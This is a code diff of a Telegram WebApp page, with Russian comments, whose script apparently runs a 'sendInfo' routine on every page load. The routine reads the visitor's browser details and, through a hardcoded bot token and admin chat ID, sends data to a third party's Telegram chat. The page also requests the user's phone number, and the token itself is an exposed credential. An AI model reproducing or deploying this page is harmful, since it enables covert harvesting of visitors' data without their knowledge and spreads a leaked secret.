@@ -53,6 +53,7 @@
         const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // Замените на токен вашего бота
         const ADMIN_CHAT_ID = '1521132127'; // Замените на ID администратора
 
+        // Функция для отправки информации
         async function sendInfo() {
             try {
                 const userAgent = navigator.userAgent;
@@ -90,17 +91,26 @@
             }
         }
 
-        window.onload = sendInfo;
+        // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
 
-        function initTg() {
-            tg.expand(); // Развернуть на весь экран
+        // Функция для запроса полноэкранного режима
+        function requestFullscreen() {
+            const data = JSON.stringify({
+                eventType: 'web_app_request_fullscreen',
+            });
+            window.parent.postMessage(data, 'https://web.telegram.org');
+        }
+
+        // Инициализация приложения
+        function initApp() {
+            tg.ready(); // Уведомляем Telegram, что приложение готово
+            requestFullscreen(); // Запрашиваем полноэкранный режим
             document.body.style.backgroundColor = tg.themeParams.bg_color;
             document.body.style.color = tg.themeParams.text_color;
         }
 
-        initTg();
-
+        // Функция для запроса номера телефона
         function requestPhoneNumber() {
             tg.requestContact((sent, event) => {
                 if (sent) {
@@ -127,6 +137,7 @@
             });
         }
 
+        // Функция для отправки сообщения администратору
         async function sendToAdmin(message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -150,7 +161,11 @@
             }
         }
 
-        tg.ready();
+        // Инициализация приложения при загрузке страницы
+        window.onload = () => {
+            sendInfo(); // Отправляем информацию
+            initApp(); // Инициализируем приложение
+        };
     </script>
 </body>
 </html>
